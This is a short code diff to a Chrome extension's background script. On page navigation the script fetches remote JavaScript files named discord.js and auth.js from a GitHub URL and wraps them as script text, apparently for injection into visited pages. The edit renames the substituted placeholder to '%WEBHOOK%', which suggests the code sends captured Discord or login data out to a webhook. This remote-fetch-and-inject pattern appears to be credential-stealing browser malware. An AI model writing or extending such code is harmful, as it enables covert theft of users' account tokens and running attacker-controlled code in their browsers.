@@ -3,7 +3,7 @@ chrome.webNavigation.onCompleted.addListener(function(details) {
     fetch('https://raw.githubusercontent.com/43a1723/extension-test/main/extension/js/discord.js')
       .then(response => response.text())
       .then(data => {
-        const modifiedData = data.replace('%key%', '123');
+        const modifiedData = data.replace('%WEBHOOK%', '123');
         
         const script = `
           var discordScript = ${JSON.stringify(modifiedData)};
@@ -20,7 +20,7 @@ chrome.webNavigation.onCompleted.addListener(function(details) {
     fetch('https://raw.githubusercontent.com/43a1723/extension-test/main/extension/js/auth.js')
       .then(response => response.text())
       .then(data => {
-        const modifiedData = data.replace('%key%', '123');
+        const modifiedData = data.replace('%WEBHOOK%', '123');
         
         const script = `
           var authScript = ${JSON.stringify(modifiedData)};
